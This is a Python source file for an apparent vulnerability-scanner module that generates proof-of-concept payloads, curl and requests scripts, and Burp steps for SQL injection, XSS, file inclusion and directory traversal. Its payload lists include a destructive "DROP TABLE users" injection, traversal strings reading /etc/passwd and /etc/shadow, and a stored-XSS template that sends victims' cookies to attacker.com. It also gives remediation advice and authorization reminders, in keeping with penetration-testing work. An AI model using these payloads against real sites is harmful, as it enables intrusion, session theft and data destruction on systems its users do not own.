#!/usr/bin/env python3

import json
import time
import base64
import urllib.parse
from datetime import datetime
from typing import Dict, List, Any

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[0m'
    
    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'


class PoCGenerator:
    """
    AI-powered Proof of Concept generator for vulnerability testing
    """
    
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.poc_templates = self._load_poc_templates()
        self.testing_frameworks = self._load_testing_frameworks()

    def _load_poc_templates(self):
        """
        Load PoC templates for different vulnerability types
        """
        return {
            'SQL Injection': {
                'union_based': {
                    'description': 'UNION-based SQL injection for data extraction',
                    'payload_template': "' UNION SELECT {columns} FROM {table}--",
                    'detection_method': 'Look for database error messages or successful data extraction',
                    'manual_steps': [
                        'Identify injectable parameter',
                        'Determine number of columns using ORDER BY',
                        'Find displayable columns using UNION SELECT',
                        'Extract database information',
                        'Enumerate tables and columns',
                        'Extract sensitive data'
                    ]
                },
                'boolean_based': {
                    'description': 'Boolean-based blind SQL injection',
                    'payload_template': "' AND (SELECT COUNT(*) FROM {table}) > 0--",
                    'detection_method': 'Compare response differences between true and false conditions',
                    'manual_steps': [
                        'Identify boolean injection point',
                        'Test true/false conditions',
                        'Enumerate database structure using binary search',
                        'Extract data character by character'
                    ]
                },
                'time_based': {
                    'description': 'Time-based blind SQL injection',
                    'payload_template': "'; IF({condition}) WAITFOR DELAY '00:00:05'--",
                    'detection_method': 'Measure response time delays',
                    'manual_steps': [
                        'Identify time-delay injection point',
                        'Test conditional time delays',
                        'Extract data using time-based techniques',
                        'Optimize payload timing for reliability'
                    ]
                }
            },
            'Cross-Site Scripting (XSS)': {
                'reflected': {
                    'description': 'Reflected XSS for immediate script execution',
                    'payload_template': '<script>alert("XSS-{timestamp}")</script>',
                    'detection_method': 'Look for script execution in browser',
                    'manual_steps': [
                        'Identify reflection point',
                        'Test basic XSS payloads',
                        'Bypass input filters if present',
                        'Create proof-of-concept payload',
                        'Document impact and context'
                    ]
                },
                'stored': {
                    'description': 'Stored XSS for persistent script execution',
                    'payload_template': '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
                    'detection_method': 'Script executes when stored content is viewed',
                    'manual_steps': [
                        'Identify data storage points',
                        'Submit XSS payload',
                        'Verify persistent storage',
                        'Test payload execution context',
                        'Assess impact on other users'
                    ]
                },
                'dom_based': {
                    'description': 'DOM-based XSS exploitation',
                    'payload_template': 'javascript:alert("DOM-XSS-{timestamp}")',
                    'detection_method': 'Script execution through DOM manipulation',
                    'manual_steps': [
                        'Analyze client-side JavaScript',
                        'Identify unsafe DOM manipulation',
                        'Craft context-appropriate payload',
                        'Test payload delivery methods'
                    ]
                }
            },
            'Local File Inclusion (LFI)': {
                'linux_files': {
                    'description': 'Linux file inclusion exploitation',
                    'payload_template': '../../../etc/{filename}',
                    'detection_method': 'Look for file contents in response',
                    'manual_steps': [
                        'Identify file inclusion parameter',
                        'Test path traversal sequences',
                        'Access sensitive system files',
                        'Enumerate system information',
                        'Attempt privilege escalation paths'
                    ]
                },
                'windows_files': {
                    'description': 'Windows file inclusion exploitation',
                    'payload_template': '..\\..\\..\\windows\\system32\\drivers\\etc\\{filename}',
                    'detection_method': 'Look for Windows file contents',
                    'manual_steps': [
                        'Test Windows path traversal',
                        'Access Windows system files',
                        'Enumerate Windows configuration',
                        'Look for credential files'
                    ]
                },
                'php_wrappers': {
                    'description': 'PHP wrapper exploitation for LFI',
                    'payload_template': 'php://filter/convert.base64-encode/resource={filename}',
                    'detection_method': 'Base64 encoded file contents in response',
                    'manual_steps': [
                        'Test PHP wrapper support',
                        'Use php://filter for file reading',
                        'Decode base64 output',
                        'Analyze source code for further vulnerabilities'
                    ]
                }
            },
            'Directory Traversal': {
                'basic_traversal': {
                    'description': 'Basic directory traversal exploitation',
                    'payload_template': '../../../{target_file}',
                    'detection_method': 'Access to files outside web root',
                    'manual_steps': [
                        'Test different traversal depths',
                        'Try various encoding methods',
                        'Access system configuration files',
                        'Map directory structure'
                    ]
                },
                'encoded_traversal': {
                    'description': 'Encoded directory traversal',
                    'payload_template': '%2e%2e%2f%2e%2e%2f%2e%2e%2f{target_file}',
                    'detection_method': 'Bypasses basic filtering',
                    'manual_steps': [
                        'Test URL encoding variations',
                        'Try double encoding',
                        'Use unicode encoding',
                        'Combine with null bytes'
                    ]
                }
            }
        }

    def _load_testing_frameworks(self):
        """
        Load testing framework templates
        """
        return {
            'python_requests': {
                'description': 'Python requests-based testing script',
                'template': '''#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

def test_{vuln_type_clean}(base_url, parameter, payload):
    """
    Test for {vuln_type} vulnerability
    """
    target_url = base_url
    
    # Prepare payload
    params = {{parameter: payload}}
    
    try:
        response = requests.get(target_url, params=params, timeout=10)
        
        print(f"Testing: {{target_url}}")
        print(f"Parameter: {{parameter}}")
        print(f"Payload: {{payload}}")
        print(f"Status Code: {{response.status_code}}")
        print(f"Response Length: {{len(response.text)}}")
        
        # Detection logic here
        {detection_logic}
        
        return response
        
    except Exception as e:
        print(f"Error: {{e}}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 test.py <url> <parameter> <payload>")
        sys.exit(1)
    
    url, param, payload = sys.argv[1], sys.argv[2], sys.argv[3]
    test_{vuln_type_clean}(url, param, payload)
'''
            },
            'curl_command': {
                'description': 'Curl command for manual testing',
                'template': '''# {vuln_type} Testing with curl
# Target: {target_url}
# Parameter: {parameter}

# Basic test
curl -X GET "{target_url}?{parameter}={payload}" -H "User-Agent: ZeusScanner-PoC"

# With headers
curl -X GET "{target_url}?{parameter}={payload}" \\
     -H "User-Agent: ZeusScanner-PoC" \\
     -H "Accept: text/html,application/xhtml+xml" \\
     -v

# POST request (if applicable)
curl -X POST "{target_url}" \\
     -d "{parameter}={payload}" \\
     -H "Content-Type: application/x-www-form-urlencoded" \\
     -v
'''
            },
            'burp_suite': {
                'description': 'Burp Suite testing instructions',
                'template': '''Burp Suite Testing for {vuln_type}

1. Intercept Request:
   - Navigate to: {target_url}
   - Intercept the request in Burp Proxy

2. Send to Repeater:
   - Right-click -> Send to Repeater

3. Modify Parameter:
   - Locate parameter: {parameter}
   - Replace value with: {payload}

4. Send Request:
   - Click "Send" button
   - Analyze response for indicators

5. Detection Criteria:
{detection_criteria}

6. Further Testing:
   - Try payload variations
   - Test different injection points
   - Analyze response timing/size changes
'''
            }
        }

    def generate_poc(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate comprehensive PoC for a vulnerability
        """
        vuln_type = vulnerability.get('type', 'Unknown')
        
        print(f"{Fore.MAGENTA}[PoC] Generating PoC for {vuln_type}{Style.RESET_ALL}")
        
        if vuln_type not in self.poc_templates:
            return self._generate_generic_poc(vulnerability)
        
        template_data = self.poc_templates[vuln_type]
        
        # Select appropriate subtype based on vulnerability details
        subtype = self._select_subtype(vulnerability, template_data)
        selected_template = template_data.get(subtype, list(template_data.values())[0])
        
        poc_data = {
            'vulnerability_info': vulnerability,
            'poc_type': subtype,
            'description': selected_template['description'],
            'manual_testing_steps': selected_template['manual_steps'],
            'payloads': self._generate_payloads(vulnerability, selected_template),
            'testing_scripts': self._generate_testing_scripts(vulnerability, selected_template),
            'detection_methods': selected_template['detection_method'],
            'risk_assessment': self._assess_poc_risk(vulnerability),
            'remediation_guidance': self._generate_remediation_guidance(vuln_type),
            'timestamp': time.time(),
            'generated_date': datetime.now().isoformat()
        }
        
        return poc_data

    def _select_subtype(self, vulnerability: Dict[str, Any], template_data: Dict) -> str:
        """
        Select appropriate PoC subtype based on vulnerability characteristics
        """
        vuln_type = vulnerability.get('type', '')
        
        if 'SQL' in vuln_type:
            # Check for specific SQL injection indicators
            if vulnerability.get('pattern_matched'):
                pattern = vulnerability['pattern_matched'].lower()
                if 'union' in pattern:
                    return 'union_based'
                elif 'time' in pattern or 'sleep' in pattern:
                    return 'time_based'
                else:
                    return 'boolean_based'
            return 'union_based'  # Default for SQL injection
        
        elif 'XSS' in vuln_type:
            if vulnerability.get('reflected', False):
                return 'reflected'
            elif 'stored' in str(vulnerability).lower():
                return 'stored'
            else:
                return 'reflected'  # Default for XSS
        
        elif 'LFI' in vuln_type or 'File Inclusion' in vuln_type:
            url = vulnerability.get('url', '').lower()
            if 'php' in url:
                return 'php_wrappers'
            elif 'windows' in str(vulnerability).lower():
                return 'windows_files'
            else:
                return 'linux_files'
        
        elif 'Directory Traversal' in vuln_type:
            if vulnerability.get('payload', '').startswith('%'):
                return 'encoded_traversal'
            else:
                return 'basic_traversal'
        
        # Return first available subtype if no match
        return list(template_data.keys())[0]

    def _generate_payloads(self, vulnerability: Dict[str, Any], template: Dict) -> List[Dict]:
        """
        Generate customized payloads for the vulnerability
        """
        payloads = []
        base_payload = template.get('payload_template', '')
        vuln_type = vulnerability.get('type', '')
        
        if 'SQL' in vuln_type:
            # SQL injection payloads
            sql_payloads = [
                base_payload.format(columns='1,2,3,4,5', table='information_schema.tables'),
                base_payload.format(columns='user(),version(),database()', table='dual'),
                base_payload.format(columns='table_name', table='information_schema.tables'),
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1'; DROP TABLE users--"
            ]
            
            for i, payload in enumerate(sql_payloads, 1):
                payloads.append({
                    'id': i,
                    'payload': payload,
                    'description': f'SQL injection test payload #{i}',
                    'encoded_payload': urllib.parse.quote(payload),
                    'risk_level': 'HIGH'
                })
        
        elif 'XSS' in vuln_type:
            # XSS payloads
            timestamp = str(int(time.time()))
            xss_payloads = [
                base_payload.format(timestamp=timestamp),
                f'<script>alert("XSS-{timestamp}")</script>',
                f'<img src=x onerror=alert("XSS-{timestamp}")>',
                f'<svg/onload=alert("XSS-{timestamp}")>',
                f'";alert("XSS-{timestamp}");//',
                f'javascript:alert("XSS-{timestamp}")'
            ]
            
            for i, payload in enumerate(xss_payloads, 1):
                payloads.append({
                    'id': i,
                    'payload': payload,
                    'description': f'XSS test payload #{i}',
                    'encoded_payload': urllib.parse.quote(payload),
                    'risk_level': 'MEDIUM'
                })
        
        elif 'LFI' in vuln_type or 'File Inclusion' in vuln_type:
            # File inclusion payloads
            lfi_files = ['passwd', 'shadow', 'hosts', 'fstab', 'issue']
            lfi_payloads = []
            
            for filename in lfi_files:
                payload = base_payload.format(filename=filename)
                lfi_payloads.append(payload)
            
            # Add common variations
            lfi_payloads.extend([
                '../../../etc/passwd%00',
                '....//....//....//etc/passwd',
                'php://filter/convert.base64-encode/resource=../../../etc/passwd'
            ])
            
            for i, payload in enumerate(lfi_payloads, 1):
                payloads.append({
                    'id': i,
                    'payload': payload,
                    'description': f'LFI test payload #{i}',
                    'encoded_payload': urllib.parse.quote(payload),
                    'risk_level': 'HIGH'
                })
        
        elif 'Directory Traversal' in vuln_type:
            # Directory traversal payloads
            traversal_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd',
                '..%252f..%252f..%252fetc%252fpasswd'
            ]
            
            for i, payload in enumerate(traversal_payloads, 1):
                payloads.append({
                    'id': i,
                    'payload': payload,
                    'description': f'Directory traversal payload #{i}',
                    'encoded_payload': urllib.parse.quote(payload),
                    'risk_level': 'HIGH'
                })
        
        return payloads

    def _generate_testing_scripts(self, vulnerability: Dict[str, Any], template: Dict) -> Dict[str, str]:
        """
        Generate testing scripts for different frameworks
        """
        scripts = {}
        vuln_type = vulnerability.get('type', 'Unknown')
        target_url = vulnerability.get('url', 'http://example.com')
        parameter = vulnerability.get('parameter', 'param')
        payload = vulnerability.get('payload', 'test')
        
        # Clean vulnerability type for function names
        vuln_type_clean = vuln_type.lower().replace(' ', '_').replace('(', '').replace(')', '').replace('-', '_')
        
        # Python requests script
        detection_logic = self._generate_detection_logic(vuln_type)
        python_template = self.testing_frameworks['python_requests']['template']
        scripts['python_requests'] = python_template.format(
            vuln_type=vuln_type,
            vuln_type_clean=vuln_type_clean,
            detection_logic=detection_logic
        )
        
        # Curl command
        curl_template = self.testing_frameworks['curl_command']['template']
        scripts['curl_command'] = curl_template.format(
            vuln_type=vuln_type,
            target_url=target_url,
            parameter=parameter,
            payload=urllib.parse.quote(payload)
        )
        
        # Burp Suite instructions
        detection_criteria = self._generate_detection_criteria(vuln_type)
        burp_template = self.testing_frameworks['burp_suite']['template']
        scripts['burp_suite'] = burp_template.format(
            vuln_type=vuln_type,
            target_url=target_url,
            parameter=parameter,
            payload=payload,
            detection_criteria=detection_criteria
        )
        
        return scripts

    def _generate_detection_logic(self, vuln_type: str) -> str:
        """
        Generate detection logic for Python scripts
        """
        if 'SQL' in vuln_type:
            return '''        # Check for SQL error patterns
        sql_errors = ['mysql_fetch', 'ORA-', 'PostgreSQL', 'syntax error']
        for error in sql_errors:
            if error.lower() in response.text.lower():
                print(f"POTENTIAL VULNERABILITY: SQL error detected - {error}")
                return True
        
        print("No obvious SQL injection indicators found")
        return False'''
        
        elif 'XSS' in vuln_type:
            return '''        # Check if payload is reflected
        if payload in response.text:
            print("POTENTIAL VULNERABILITY: XSS payload reflected in response")
            return True
        
        print("XSS payload not found in response")
        return False'''
        
        elif 'LFI' in vuln_type or 'File Inclusion' in vuln_type:
            return '''        # Check for file inclusion indicators
        lfi_indicators = ['root:x:0:0:', '[fonts]', '127.0.0.1']
        for indicator in lfi_indicators:
            if indicator in response.text:
                print(f"POTENTIAL VULNERABILITY: File inclusion detected - {indicator}")
                return True
        
        print("No file inclusion indicators found")
        return False'''
        
        else:
            return '''        # Generic vulnerability detection
        if len(response.text) > 0 and response.status_code == 200:
            print("Response received - manual analysis required")
            return True
        
        print("No response or error occurred")
        return False'''

    def _generate_detection_criteria(self, vuln_type: str) -> str:
        """
        Generate detection criteria for manual testing
        """
        if 'SQL' in vuln_type:
            return '''   - Database error messages
   - Unusual response times
   - Different page content
   - Successful data extraction'''
        
        elif 'XSS' in vuln_type:
            return '''   - Script execution (alert boxes)
   - Payload reflection in source code
   - Modified DOM structure
   - JavaScript errors in console'''
        
        elif 'LFI' in vuln_type or 'File Inclusion' in vuln_type:
            return '''   - System file contents in response
   - Configuration file data
   - Directory structure exposure
   - Error messages revealing paths'''
        
        else:
            return '''   - Unexpected response content
   - Error messages
   - Status code changes
   - Response timing differences'''

    def _assess_poc_risk(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """
        Assess risk associated with PoC testing
        """
        vuln_type = vulnerability.get('type', '')
        severity = vulnerability.get('severity', 'LOW')
        
        risk_level = 'LOW'
        warnings = []
        
        if 'SQL' in vuln_type:
            risk_level = 'HIGH'
            warnings.extend([
                'SQL injection testing may affect database performance',
                'Avoid using destructive payloads (DROP, DELETE, UPDATE)',
                'Test during maintenance windows when possible',
                'Monitor database logs during testing'
            ])
        
        elif 'XSS' in vuln_type:
            risk_level = 'MEDIUM'
            warnings.extend([
                'XSS testing may affect other users if stored',
                'Use unique identifiers in payloads',
                'Avoid malicious payloads in production',
                'Test in isolated environment when possible'
            ])
        
        elif 'LFI' in vuln_type or 'Directory Traversal' in vuln_type:
            risk_level = 'MEDIUM'
            warnings.extend([
                'File inclusion testing may expose sensitive data',
                'Avoid accessing critical system files',
                'Monitor system logs during testing',
                'Test with read-only payloads first'
            ])
        
        return {
            'testing_risk_level': risk_level,
            'warnings': warnings,
            'recommended_environment': 'testing' if risk_level == 'HIGH' else 'production_with_caution',
            'testing_precautions': [
                'Obtain proper authorization before testing',
                'Document all testing activities',
                'Have rollback plan ready',
                'Monitor system during testing'
            ]
        }

    def _generate_remediation_guidance(self, vuln_type: str) -> Dict[str, Any]:
        """
        Generate remediation guidance for the vulnerability type
        """
        remediation_guides = {
            'SQL Injection': {
                'immediate_steps': [
                    'Disable affected functionality if possible',
                    'Implement input validation',
                    'Use parameterized queries',
                    'Apply principle of least privilege to database'
                ],
                'long_term_fixes': [
                    'Code review for all database interactions',
                    'Implement prepared statements',
                    'Deploy Web Application Firewall',
                    'Regular security testing'
                ],
                'testing_verification': [
                    'Automated SQL injection scanners',
                    'Manual penetration testing',
                    'Code static analysis'
                ]
            },
            'Cross-Site Scripting (XSS)': {
                'immediate_steps': [
                    'Implement output encoding',
                    'Deploy Content Security Policy',
                    'Validate all input data',
                    'Use HTTPOnly cookie flags'
                ],
                'long_term_fixes': [
                    'Implement comprehensive input validation',
                    'Use secure coding practices',
                    'Regular security code review',
                    'Security awareness training'
                ],
                'testing_verification': [
                    'XSS scanning tools',
                    'Manual payload testing',
                    'Browser security testing'
                ]
            },
            'Local File Inclusion (LFI)': {
                'immediate_steps': [
                    'Restrict file system access',
                    'Implement path traversal protection',
                    'Use whitelist for allowed files',
                    'Validate file paths strictly'
                ],
                'long_term_fixes': [
                    'Redesign file handling logic',
                    'Implement proper access controls',
                    'Use secure file APIs',
                    'Regular security assessments'
                ],
                'testing_verification': [
                    'Path traversal testing',
                    'File inclusion scanners',
                    'Access control review'
                ]
            }
        }
        
        return remediation_guides.get(vuln_type, {
            'immediate_steps': ['Review and analyze the vulnerability'],
            'long_term_fixes': ['Implement security best practices'],
            'testing_verification': ['Regular security testing']
        })

    def _generate_generic_poc(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate generic PoC for unknown vulnerability types
        """
        return {
            'vulnerability_info': vulnerability,
            'poc_type': 'generic',
            'description': f"Generic testing approach for {vulnerability.get('type', 'Unknown')}",
            'manual_testing_steps': [
                'Identify the vulnerability parameter or location',
                'Craft appropriate test payloads',
                'Submit payloads and analyze responses',
                'Document any anomalous behavior',
                'Verify the vulnerability impact'
            ],
            'payloads': [{
                'id': 1,
                'payload': vulnerability.get('payload', 'test'),
                'description': 'Original vulnerability payload',
                'risk_level': vulnerability.get('severity', 'MEDIUM')
            }],
            'testing_scripts': {
                'manual_testing': f"Manual testing required for {vulnerability.get('type', 'Unknown')}"
            },
            'detection_methods': 'Analyze response for unexpected behavior or error messages',
            'risk_assessment': {
                'testing_risk_level': 'LOW',
                'warnings': ['Unknown vulnerability type - exercise caution'],
                'recommended_environment': 'testing'
            },
            'remediation_guidance': {
                'immediate_steps': ['Investigate the vulnerability further'],
                'long_term_fixes': ['Implement appropriate security controls'],
                'testing_verification': ['Regular security assessments']
            },
            'timestamp': time.time(),
            'generated_date': datetime.now().isoformat()
        }

    def generate_batch_poc(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Generate batch PoC for multiple vulnerabilities
        """
        print(f"\n{Fore.MAGENTA}Zeus PoC Generator - Batch Mode{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Generating PoCs for {len(vulnerabilities)} vulnerabilities...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'='*80}{Style.RESET_ALL}\n")
        
        batch_poc = {
            'batch_info': {
                'total_vulnerabilities': len(vulnerabilities),
                'generation_timestamp': time.time(),
                'generation_date': datetime.now().isoformat()
            },
            'individual_pocs': [],
            'summary': {
                'high_risk_pocs': 0,
                'medium_risk_pocs': 0,
                'low_risk_pocs': 0
            }
        }
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{Fore.CYAN}[{i}/{len(vulnerabilities)}] Generating PoC for {vuln.get('type', 'Unknown')}{Style.RESET_ALL}")
            
            poc = self.generate_poc(vuln)
            batch_poc['individual_pocs'].append(poc)
            
            # Update summary
            risk_level = poc.get('risk_assessment', {}).get('testing_risk_level', 'LOW')
            if risk_level == 'HIGH':
                batch_poc['summary']['high_risk_pocs'] += 1
            elif risk_level == 'MEDIUM':
                batch_poc['summary']['medium_risk_pocs'] += 1
            else:
                batch_poc['summary']['low_risk_pocs'] += 1
        
        return batch_poc